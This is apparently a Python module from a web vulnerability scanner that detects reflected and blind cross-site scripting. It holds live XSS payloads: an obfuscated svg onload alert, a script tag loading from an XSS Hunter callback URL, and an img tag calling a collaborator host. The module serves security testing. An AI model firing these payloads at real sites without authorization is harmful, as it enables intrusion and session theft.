
from core.scan.module import *


class XSS(GeneralScanner):

    def __init__(self, config) -> None:
        GeneralScanner.__init__(self, config)

        self.xsshunter    = self.options.get('xsshunter')
        self.collaborator = self.options.get('collaborator')

    def check(self):
        params = self.request.GetParams()

        # If xsshunter or collaborator were used, we have to attack all params
        # To detect blind cases 

        if self.xsshunter or self.collaborator:
            # Include all parameters even those that are not reflected in the same page
            self.vulnerable_params.extend(params)

            # We have to not resume
            return True

        counter = 0

        for p in params:
            params[p] = f"Hello{str(counter)}"
            counter += 1

        self.request.SetParams(params)
        res = self.request.Send()
        ret = False

        for i in range(len(params)):
            value = f"Hello{str(i)}"
            if value in res.text:
                # Get key by value 
                vulnerable_param = list(params.keys())[list(params.values()).index(value)]
                self.vulnerable_params.append(vulnerable_param)
                ret = True

        return ret
        
    def GetPayloads(self):

        payloads = [
            '"><svg onload=alert&#0000000040`XSSB00M`)>'
        ]

        if self.xsshunter:
            payloads.append(f"\"><sCRiPt src={self.xsshunter}></ScrIpT>")

        if self.collaborator:
            host = urlparse(self.collaborator).netloc
            payloads.append(f"<ImG sRc=\"http://{host}\">")

        return payloads

    def is_vulnerable(self, res) -> bool:
        for payload in self.GetPayloads():
            if payload in res.text and self._is_valid_xss_response(res):
                return True

        return False

    def _is_valid_xss_response(self,response):
        return 'text' in response.headers.get('Content-Type')
